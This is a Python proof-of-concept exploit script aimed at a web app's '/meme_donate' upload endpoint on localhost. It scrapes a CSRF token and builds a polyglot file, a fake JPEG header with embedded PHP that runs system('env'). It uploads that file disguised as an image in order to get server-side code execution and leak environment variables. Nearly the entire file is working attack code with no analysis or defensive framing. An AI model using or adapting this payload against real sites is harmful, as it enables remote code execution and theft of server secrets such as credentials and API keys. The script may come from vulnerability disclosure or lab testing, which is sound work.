import requests
from bs4 import BeautifulSoup

def get_session_and_csrf(url: str) -> tuple[requests.Session, str]:
    """
    Initiates a session and retrieves CSRF token.

    Args:
        url (str): The target URL to fetch CSRF token from.

    Returns:
        tuple: A tuple containing a requests.Session object and the CSRF token.
    """
    session = requests.Session()
    try:
        response = session.get(url)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find('input', attrs={'name': '_token'})
        csrf_token = token_input['value'] if token_input else ''
        return session, csrf_token
    except requests.RequestException as e:
        print(f"Error fetching CSRF token: {e}")
        return session, ''

def generate_fake_phar(filename: str = "mal.phar"):
    """
    Creates a fake .phar file with a JPEG header and embedded PHP code.

    Args:
        filename (str): The name of the file to create.
    """
    try:
        with open(filename, "rb"):
            pass
    except FileNotFoundError:
        jpeg_header:bytes = b"\xFF\xD8\xFF\xE0" + b"\x00" * 100
        payload:bytes = b"<pre><?php system(\"env\"); ?></pre>"
        with open(filename, "wb") as f:
            f.write(jpeg_header + payload)
        print(f"Generated fake PHAR: {filename}")

def poc():
    url = "http://localhost:8000/meme_donate"
    session, csrf_token = get_session_and_csrf(url)

    if not csrf_token:
        print("Failed to retrieve CSRF token.")
        return

    filename: str = "mal2.phar"
    generate_fake_phar(filename)

    with open(filename, "rb") as f:
        files = {
            "file": (filename, f, "image/jpeg")
        }
        headers = {
            "User-Agent": "Mozilla/5.0"
        }

        try:
            res = session.post(url, files=files, headers=headers, data={"_token": csrf_token})
            if res.status_code == 200:
                print("File uploaded successfully.")
                print("Response:", res.text)
            else:
                print("Upload failed with status:", res.status_code)
        except requests.RequestException as e:
            print("An error occurred during upload:", e)

# Run the PoC
poc()
